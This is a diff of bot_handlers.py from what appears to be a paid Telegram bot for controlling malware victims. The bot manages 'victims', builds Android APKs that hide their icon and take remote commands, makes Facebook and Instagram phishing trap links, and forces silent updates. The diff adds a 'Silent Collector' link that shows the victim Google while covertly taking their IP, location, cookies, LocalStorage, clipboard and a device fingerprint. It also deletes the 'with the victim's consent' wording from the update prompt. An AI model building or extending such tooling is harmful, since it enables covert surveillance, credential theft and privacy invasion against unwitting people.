@@ -1,7 +1,7 @@
 # bot_handlers.py
 # ============================================================
 # معالجات البوت الرئيسية: /start + callback + step handlers
-# v7 — بعد حذف RAT / QR / LSH / SH
+# v8 — مع Silent Collector
 # ============================================================
 
 import io
@@ -36,6 +36,10 @@ from imports_manager import (
     queue_victim_command,
     # APK Manager
     build_apk_panel, push_apk_command,
+    # ★ Silent Collector
+    generate_silent_link,
+    get_silent_data,
+    get_user_silent_sessions,
 )
 
 from logging_config import get_logger
@@ -82,7 +86,7 @@ except ImportError:
 # القوائم
 # ============================================================
 def main_menu(user_id=None):
-    """القائمة الرئيسية — بعد حذف 4 أدوات"""
+    """القائمة الرئيسية"""
     markup = InlineKeyboardMarkup()
     markup.add(InlineKeyboardButton("👥 إدارة الضحايا", callback_data="v_list"))
     markup.add(InlineKeyboardButton("📱 تطبيق الضحية (APK)", callback_data="v_new"))
@@ -93,11 +97,10 @@ def main_menu(user_id=None):
         callback_data="open_dashboard"
     ))
 
-    # الروابط والمصائد
+    # ★ الأدوات
+    markup.add(InlineKeyboardButton("🎯 جمع المعلومات (Silent)", callback_data="gen_silent"))
     markup.add(InlineKeyboardButton("🔗 توليد رابط مصيدة فيسبوك", callback_data="gen_fb"))
     markup.add(InlineKeyboardButton("📸 توليد رابط مصيدة انستقرام", callback_data="gen_ig"))
-
-    # ← أماكن الأدوات الجديدة
 
     # الاشتراكات
     markup.add(InlineKeyboardButton("💎 الاشتراكات والدفع", callback_data="payment_menu"))
@@ -107,6 +110,16 @@ def main_menu(user_id=None):
         markup.add(InlineKeyboardButton("👑 لوحة تحكم الأدمن", callback_data="admin_panel"))
 
     return markup
+
+
+def silent_collector_panel():
+    """لوحة Silent Collector"""
+    m = InlineKeyboardMarkup()
+    m.add(InlineKeyboardButton("➕ لينك جديد", callback_data="silent_new"))
+    m.add(InlineKeyboardButton("📊 الإحصائيات", callback_data="silent_stats"))
+    m.add(InlineKeyboardButton("📋 آخر النتائج", callback_data="silent_recent"))
+    m.add(InlineKeyboardButton("🔙 رجوع للقائمة", callback_data="back_to_main"))
+    return m
 
 
 def victim_commands_panel(victim_id):
@@ -371,6 +384,49 @@ def start_command(message):
 
 
 # ============================================================
+# /silent — أمر سريع
+# ============================================================
+@bot.message_handler(commands=['silent', 'collect'])
+def silent_command(message):
+    """أمر سريع لإنشاء رابط Silent Collector"""
+    chat_id = message.chat.id
+    user_id = message.from_user.id
+
+    logger.info(f"/silent from {user_id}")
+
+    try:
+        get_or_create_user(
+            user_id,
+            message.from_user.username or "Unknown",
+            message.from_user.first_name or "User"
+        )
+    except Exception as e:
+        logger.exception(f"get_or_create_user error: {e}")
+
+    check = can_use_tool(chat_id, "silent")
+    if not check["allowed"]:
+        bot.send_message(
+            chat_id,
+            _deny_message(check["reason"], chat_id, "silent", check),
+            parse_mode="HTML"
+        )
+        return
+
+    consume_usage(chat_id, "silent")
+
+    msg = bot.send_message(
+        chat_id,
+        "🎯 <b>جمع المعلومات</b>\n"
+        "━━━━━━━━━━━━━━━━━━\n\n"
+        "أرسل <b>اسم/وصف</b> للضحية\n"
+        "مثال: <code>أحمد</code> أو <code>زميل الشغل</code>\n\n"
+        "⏱️ الرابط صالح 30 يوم",
+        parse_mode="HTML"
+    )
+    bot.register_next_step_handler(msg, silent_label_handler)
+
+
+# ============================================================
 # /dashboard
 # ============================================================
 @bot.message_handler(commands=['dashboard', 'dash', 'panel_web', 'web'])
@@ -470,6 +526,126 @@ def _handle_callback(call, chat_id, user_id, data):
     """المنطق الفعلي للـ callback"""
 
     # ============================================================
+    # ★★★ Silent Collector ★★★
+    # ============================================================
+    if data == "gen_silent":
+        check = can_use_tool(chat_id, "silent")
+        if not check["allowed"]:
+            bot.answer_callback_query(call.id, "❌ لا يوجد رصيد", show_alert=True)
+            bot.send_message(
+                chat_id,
+                _deny_message(check["reason"], chat_id, "silent", check),
+                parse_mode="HTML"
+            )
+            return
+        consume_usage(chat_id, "silent")
+        bot.answer_callback_query(call.id)
+
+        msg = bot.send_message(
+            chat_id,
+            "🎯 <b>جمع المعلومات</b>\n"
+            "━━━━━━━━━━━━━━━━━━\n\n"
+            "أرسل <b>اسم/وصف</b> للضحية\n"
+            "مثال: <code>أحمد</code> أو <code>زميل الشغل</code>\n\n"
+            "⏱️ الرابط صالح 30 يوم",
+            parse_mode="HTML"
+        )
+        bot.register_next_step_handler(msg, silent_label_handler)
+        return
+
+    if data == "silent_new":
+        bot.answer_callback_query(call.id)
+        check = can_use_tool(chat_id, "silent")
+        if not check["allowed"]:
+            bot.send_message(chat_id, _deny_message(check["reason"], chat_id, "silent", check),
+                             parse_mode="HTML")
+            return
+        consume_usage(chat_id, "silent")
+
+        msg = bot.send_message(
+            chat_id,
+            "🎯 <b>لينك جديد</b>\n\nأرسل <b>اسم/وصف</b>:",
+            parse_mode="HTML"
+        )
+        bot.register_next_step_handler(msg, silent_label_handler)
+        return
+
+    if data == "silent_stats":
+        bot.answer_callback_query(call.id, "📊 جاري الحساب...")
+
+        try:
+            sessions = get_user_silent_sessions(user_id, limit=200) or []
+
+            total = len(sessions)
+            accessed = sum(1 for s in sessions if s.get('accessed'))
+            collected = sum(1 for s in sessions if s.get('collected'))
+
+            text = (
+                "📊 <b>إحصائيات Silent Collector</b>\n"
+                "━━━━━━━━━━━━━━━━━━\n\n"
+                f"🔗 <b>إجمالي اللينكات:</b> <code>{total}</code>\n"
+                f"👁️ <b>تم فتحها:</b> <code>{accessed}</code>\n"
+                f"✅ <b>جمعت بيانات:</b> <code>{collected}</code>\n"
+            )
+
+            if total > 0:
+                rate = (collected / total) * 100
+                text += f"📈 <b>نسبة النجاح:</b> <code>{rate:.1f}%</code>\n"
+
+        except Exception as e:
+            logger.exception(f"silent_stats error: {e}")
+            text = f"❌ خطأ: {h(str(e)[:200])}"
+
+        bot.send_message(chat_id, text, parse_mode="HTML",
+                         reply_markup=silent_collector_panel())
+        return
+
+    if data == "silent_recent":
+        bot.answer_callback_query(call.id, "📋 جاري التحميل...")
+
+        try:
+            sessions = get_user_silent_sessions(user_id, limit=10) or []
+
+            if not sessions:
+                bot.send_message(
+                    chat_id,
+                    "📭 <b>لا يوجد لينكات بعد</b>",
+                    parse_mode="HTML",
+                    reply_markup=silent_collector_panel()
+                )
+                return
+
+            lines = ["📋 <b>آخر 10 لينكات</b>\n━━━━━━━━━━━━━━━━━━\n"]
+
+            for s in sessions[:10]:
+                sid = s.get('session_id', '?')[:12]
+                label = s.get('label', '')
+                accessed = s.get('accessed', False)
+                collected = s.get('collected', False)
+
+                if collected:
+                    icon = "✅"
+                elif accessed:
+                    icon = "👁️"
+                else:
+                    icon = "⏳"
+
+                label_text = f" — {h(label)}" if label else ""
+                lines.append(f"{icon} <code>{h(sid)}</code>{label_text}")
+
+            bot.send_message(
+                chat_id,
+                "\n".join(lines),
+                parse_mode="HTML",
+                reply_markup=silent_collector_panel()
+            )
+
+        except Exception as e:
+            logger.exception(f"silent_recent error: {e}")
+            bot.send_message(chat_id, f"❌ خطأ: {h(str(e)[:200])}", parse_mode="HTML")
+        return
+
+    # ============================================================
     # فتح Dashboard
     # ============================================================
     if data == "open_dashboard":
@@ -492,15 +668,10 @@ def _handle_callback(call, chat_id, user_id, data):
                 "🔐 <b>رابط الدخول للوحة التحكم</b>\n"
                 "━━━━━━━━━━━━━━━━━━\n"
                 "⏰ <i>الرابط صالح لمدة 5 دقائق فقط</i>\n"
-                "🛡️ <i>لا تشاركه مع أي شخص</i>\n\n"
-                "💡 <b>يحتوي على:</b>\n"
-                "• قائمة ضحاياك مع الحالة\n"
-                "• إرسال أوامر مباشرة\n"
-                "• إحصائيات مفصلة",
+                "🛡️ <i>لا تشاركه مع أي شخص</i>",
                 parse_mode="HTML",
                 reply_markup=markup
             )
-            logger.info(f"Dashboard link sent to {user_id}")
 
         except Exception as e:
             logger.exception(f"open_dashboard error: {e}")
@@ -571,7 +742,7 @@ def _handle_callback(call, chat_id, user_id, data):
             "🚨 هذا الأمر سيجبر <b>كل الضحايا المتصلين</b> على:\n"
             "• فحص وجود تحديث فوراً\n"
             "• تحميل التحديث الجديد\n"
-            "• تثبيته تلقائياً (بموافقة الضحية)\n\n"
+            "• تثبيته تلقائياً\n\n"
             "هل أنت متأكد؟",
             parse_mode="HTML",
             reply_markup=m
@@ -600,10 +771,6 @@ def _handle_callback(call, chat_id, user_id, data):
                     "━━━━━━━━━━━━━━━━━━\n\n"
                     f"👥 <b>الضحايا المتأثرون:</b> ~<code>{victims}</code>\n"
                     f"⏰ <b>المدة:</b> ساعة واحدة\n"
-                    f"📡 <b>آلية العمل:</b>\n"
-                    f"  • كل ضحية تفحص التحديث خلال 5 دقائق\n"
-                    f"  • 100% سيكونون محدّثين خلال ساعة\n\n"
-                    "💡 <i>استخدم /update لمتابعة الحالة</i>"
                 )
             else:
                 text = "❌ Redis غير متصل"
@@ -624,10 +791,8 @@ def _handle_callback(call, chat_id, user_id, data):
         bot.answer_callback_query(call.id)
         msg = bot.send_message(
             chat_id,
-            "🎯 <b>تحديث ضحية محددة</b>\n"
-            "━━━━━━━━━━━━━━━━━━\n\n"
-            "أرسل <b>Victim Token</b> أو <b>Device ID</b>\n\n"
-            "💡 <i>هتلاقيه في لوحة الضحية</i>",
+            "🎯 <b>تحديث ضحية محددة</b>\n\n"
+            "أرسل <b>Victim Token</b> أو <b>Device ID</b>",
             parse_mode="HTML"
         )
         bot.register_next_step_handler(msg, upd_target_handler)
@@ -656,8 +821,7 @@ def _handle_callback(call, chat_id, user_id, data):
 
             bot.send_message(
                 chat_id,
-                "✅ <b>تم مسح Cache</b>\n\n"
-                "🔄 التحديث القادم سيعيد التحميل",
+                "✅ <b>تم مسح Cache</b>",
                 parse_mode="HTML",
                 reply_markup=build_update_panel()
             )
@@ -718,22 +882,9 @@ def _handle_callback(call, chat_id, user_id, data):
             text = (
                 "⚙️ <b>إعدادات التحديث</b>\n"
                 "━━━━━━━━━━━━━━━━━━\n\n"
-
                 "📌 <b>السيرفر:</b>\n"
                 f"  • النسخة: <code>{CURRENT_VERSION_NAME}</code>\n"
-                f"  • الكود: <code>{CURRENT_VERSION_CODE}</code>\n\n"
-
-                "🔄 <b>معدل الفحص في APK:</b>\n"
-                "  • عند التشغيل: <code>فوري</code>\n"
-                "  • دوري: <code>كل 60 دقيقة</code>\n\n"
-
-                "📥 <b>آلية التحميل:</b>\n"
-                "  • المصدر: <code>GitHub Releases</code>\n"
-                "  • Cache: <code>30 يوم</code>\n"
-                "  • SHA256: <code>مُفعّل</code>\n\n"
-
-                "💡 <i>لتغيير الإعدادات، عدّل الأكواد في</i>\n"
-                "<code>apk_updater.py</code> و<code>UpdateChecker.java</code>"
+                f"  • الكود: <code>{CURRENT_VERSION_CODE}</code>\n"
             )
         except Exception as e:
             text = f"❌ {h(str(e)[:200])}"
@@ -796,10 +947,8 @@ def _handle_callback(call, chat_id, user_id, data):
 
         msg = bot.send_message(
             chat_id,
-            "📝 <b>إضافة ضحية جديدة</b>\n"
-            "━━━━━━━━━━━━━━━━━━\n\n"
-            "أرسل اسم الضحية (مثلاً: <code>أحمد</code>)\n\n"
-            "⏱️ <i>لديك 60 ثانية</i>",
+            "📝 <b>إضافة ضحية جديدة</b>\n\n"
+            "أرسل اسم الضحية (مثلاً: <code>أحمد</code>)",
             parse_mode="HTML"
         )
         bot.register_next_step_handler(msg, victim_name_step)
@@ -1182,9 +1331,7 @@ def _handle_callback(call, chat_id, user_id, data):
         bot.answer_callback_query(call.id, "⚙️ جاري الفتح...")
         bot.send_message(
             chat_id,
-            "⚙️ <b>إدارة التحديثات</b>\n"
-            "━━━━━━━━━━━━━━━━━━\n\n"
-            "🎯 اختر العملية:",
+            "⚙️ <b>إدارة التحديثات</b>",
             parse_mode="HTML",
             reply_markup=build_update_panel()
         )
@@ -1410,7 +1557,6 @@ def _handle_callback(call, chat_id, user_id, data):
         bot.register_next_step_handler(msg, admin_grant_vip_handler)
         return
 
-    # ★★★ النقطة اللي كانت فيها مشكلة — تم إصلاحها ★★★
     if data == "admin_give_stars":
         if not is_admin(user_id):
             return
@@ -1479,6 +1625,56 @@ def _handle_callback(call, chat_id, user_id, data):
 
 
 # ============================================================
+# ★★★ Silent Collector Step Handler ★★★
+# ============================================================
+def silent_label_handler(message):
+    """يستقبل اسم/وصف الضحية وينشئ الرابط"""
+    chat_id = message.chat.id
+    if not message.text:
+        bot.send_message(chat_id, "❌ اسم غير صحيح")
+        return
+
+    label = message.text.strip()[:50]
+
+    try:
+        link = generate_silent_link(chat_id, label)
+
+        if not link:
+            bot.send_message(chat_id, "❌ فشل توليد الرابط، حاول مرة أخرى")
+            return
+
+        text = (
+            f"✅ <b>الرابط جاهز!</b>\n"
+            f"━━━━━━━━━━━━━━━━━━\n\n"
+            f"🏷️ <b>الاسم:</b> <code>{h(label)}</code>\n"
+            f"⏰ <b>الصلاحية:</b> 30 يوم\n\n"
+            f"🎯 <b>الرابط:</b>\n"
+            f"<code>{h(link)}</code>\n\n"
+            f"📋 <b>ماذا سيتم جمعه:</b>\n"
+            f"• IP الحقيقي + WebRTC\n"
+            f"• الموقع التقريبي\n"
+            f"• الجهاز والمتصفح\n"
+            f"• دقة الشاشة + GPU\n"
+            f"• البطارية + حالة الشحن\n"
+            f"• الكوكيز + LocalStorage\n"
+            f"• IndexedDB + Cache\n"
+            f"• الحافظة\n"
+            f"• بصمة فريدة للجهاز\n\n"
+            f"💡 <i>الضحية تشوف Google مباشرة!</i>"
+        )
+
+        markup = InlineKeyboardMarkup()
+        markup.add(InlineKeyboardButton("🎯 لوحة Silent", callback_data="gen_silent"))
+        markup.add(InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main"))
+
+        bot.send_message(chat_id, text, parse_mode="HTML", reply_markup=markup)
+
+    except Exception as e:
+        logger.exception(f"silent_label_handler error: {e}")
+        bot.send_message(chat_id, f"❌ خطأ: {h(str(e)[:100])}", parse_mode="HTML")
+
+
+# ============================================================
 # Step Handler — Target Update
 # ============================================================
 def upd_target_handler(message):
@@ -1493,7 +1689,6 @@ def upd_target_handler(message):
     target = message.text.strip()
 
     try:
-        found_victim = None
         found_victim_id = None
 
         if redis_client:
@@ -1503,7 +1698,6 @@ def upd_target_handler(message):
                 import json
                 info = json.loads(raw)
                 found_victim_id = info.get("victim_id")
-                found_victim = info
 
             if not found_victim_id:
                 keys = redis_client.keys("victim:*:*")
@@ -1512,7 +1706,6 @@ def upd_target_handler(message):
                         v = redis_client.hgetall(key)
                         if v.get("device_id") == target:
                             found_victim_id = v.get("victim_id")
-                            found_victim = v
                             break
                     except Exception:
                         continue
@@ -1538,8 +1731,7 @@ def upd_target_handler(message):
             f"✅ <b>تم تفعيل التحديث لضحية محددة</b>\n"
             f"━━━━━━━━━━━━━━━━━━\n"
             f"🆔 <code>{h(found_victim_id[:16])}</code>\n"
-            f"⏰ المدة: ساعة\n\n"
-            f"💡 <i>الضحية ستحدّث نفسها في غضون 5 دقائق</i>",
+            f"⏰ المدة: ساعة",
             parse_mode="HTML",
             reply_markup=build_update_panel()
         )
@@ -1557,13 +1749,12 @@ def upd_target_handler(message):
 # Build & Send APK
 # ============================================================
 def _build_and_send_apk(chat_id, victim_name, victim_token, wait_msg_id):
-    """يبني APK ويرسله للبوت (في thread منفصل)"""
+    """يبني APK ويرسله للبوت"""
     if not GITHUB_TOKEN:
         try:
             bot.edit_message_text(
                 f"⚠️ <b>GITHUB_TOKEN غير مضبوط</b>\n\n"
-                f"🔑 <b>كود الضحية:</b>\n<code>{h(victim_token)}</code>\n\n"
-                f"📋 ثبّت APK عام وأدخل الكود يدوياً",
+                f"🔑 <b>كود الضحية:</b>\n<code>{h(victim_token)}</code>",
                 chat_id=chat_id, message_id=wait_msg_id,
                 parse_mode="HTML"
             )
@@ -1576,8 +1767,7 @@ def _build_and_send_apk(chat_id, victim_name, victim_token, wait_msg_id):
     if not success:
         try:
             bot.edit_message_text(
-                f"❌ <b>فشل تشغيل البناء</b>\n\n"
-                f"🔑 التوكن: <code>{h(victim_token[:32])}</code>",
+                f"❌ <b>فشل تشغيل البناء</b>",
                 chat_id=chat_id, message_id=wait_msg_id,
                 parse_mode="HTML"
             )
@@ -1588,9 +1778,7 @@ def _build_and_send_apk(chat_id, victim_name, victim_token, wait_msg_id):
     try:
         bot.edit_message_text(
             f"✅ <b>تم تشغيل البناء بنجاح</b>\n\n"
-            f"⏳ <i>جاري انتظار GitHub Actions...</i>\n"
-            f"🆔 Token: <code>{h(victim_token[:16])}</code>\n"
-            f"⏱️ <i>الوقت المتوقع: 2-5 دقائق</i>",
+            f"⏳ <i>جاري انتظار GitHub Actions...</i>",
             chat_id=chat_id, message_id=wait_msg_id,
             parse_mode="HTML"
         )
@@ -1603,12 +1791,9 @@ def _build_and_send_apk(chat_id, victim_name, victim_token, wait_msg_id):
         try:
             bot.edit_message_text(
                 f"⏰ <b>انتهت مهلة الانتظار</b>\n\n"
-                f"👤 <code>{h(victim_name)}</code>\n"
-                f"🔗 تحقق يدوياً:\n"
-                f"https://github.com/{GITHUB_REPO}/releases",
+                f"👤 <code>{h(victim_name)}</code>",
                 chat_id=chat_id, message_id=wait_msg_id,
-                parse_mode="HTML",
-                disable_web_page_preview=True
+                parse_mode="HTML"
             )
         except Exception as e:
             logger.warning(f"edit_message_text error: {e}")
@@ -1635,9 +1820,7 @@ def _build_and_send_apk(chat_id, victim_name, victim_token, wait_msg_id):
                     f"1. أرسل APK للضحية\n"
                     f"2. تثبّته على تليفونها\n"
                     f"3. <b>تفتحه وتوافق على كل الصلاحيات</b>\n"
-                    f"4. تختفي الأيقونة بعد 5 ثواني\n"
-                    f"5. <b>هتظهر تلقائياً في ضحاياك</b> ✅\n\n"
-                    f"🎛️ <b>بعد كده:</b> ارجع → إدارة الضحايا → اضغط عليها"
+                    f"4. تختفي الأيقونة بعد 5 ثواني"
                 ),
                 parse_mode="HTML"
             )
@@ -1645,8 +1828,7 @@ def _build_and_send_apk(chat_id, victim_name, victim_token, wait_msg_id):
         else:
             bot.send_message(
                 chat_id,
-                f"❌ فشل تحميل APK\n🔗 {h(apk_url)}",
-                disable_web_page_preview=True,
+                f"❌ فشل تحميل APK",
                 parse_mode="HTML"
             )
     except Exception as e:
@@ -1670,8 +1852,6 @@ def victim_name_step(message):
     wait_msg = bot.send_message(
         chat_id,
         f"⏳ <b>جاري تجهيز APK لـ</b> <code>{h(victim_name)}</code>\n\n"
-        f"━━━━━━━━━━━━━━━━━━\n"
-        f"🔨 <i>بناء التطبيق في GitHub Actions</i>\n"
         f"⏱️ <i>الوقت المتوقع: 2-4 دقائق</i>",
         parse_mode="HTML"
     )
@@ -1691,7 +1871,7 @@ def victim_name_step(message):
     victim_token = victim.get("victim_token")
     victim_id = victim.get("victim_id")
 
-    logger.info(f"Victim created: {victim_name} | {victim_id} | token={victim_token[:16]}")
+    logger.info(f"Victim created: {victim_name} | {victim_id}")
 
     threading.Thread(
         target=_build_and_send_apk,
@@ -1751,7 +1931,7 @@ def v_rename_step(message, victim_id):
 
 
 def victim_name_handler(message):
-    """لـ Session Hunter القديم - محتفظ بها للتوافق"""
+    """لـ Session Hunter القديم"""
     if not message.text:
         return
     name = message.text.strip()[:50]
@@ -1761,19 +1941,12 @@ def victim_name_handler(message):
         try:
             redis_client.setex(f"pending_victim_name:{chat_id}", 300, name)
         except Exception as e:
-            logger.warning(f"redis setex pending_victim_name error: {e}")
+            logger.warning(f"redis setex error: {e}")
 
     markup = InlineKeyboardMarkup()
     markup.row(
         InlineKeyboardButton("📘 Facebook", callback_data="victim_site_facebook"),
         InlineKeyboardButton("📷 Instagram", callback_data="victim_site_instagram"),
-    )
-    markup.row(
-        InlineKeyboardButton("🎵 TikTok", callback_data="victim_site_tiktok"),
-        InlineKeyboardButton("🐦 Twitter/X", callback_data="victim_site_twitter"),
-    )
-    markup.row(
-        InlineKeyboardButton("📱 تطبيق عام (General)", callback_data="victim_site_general"),
     )
 
     bot.send_message(
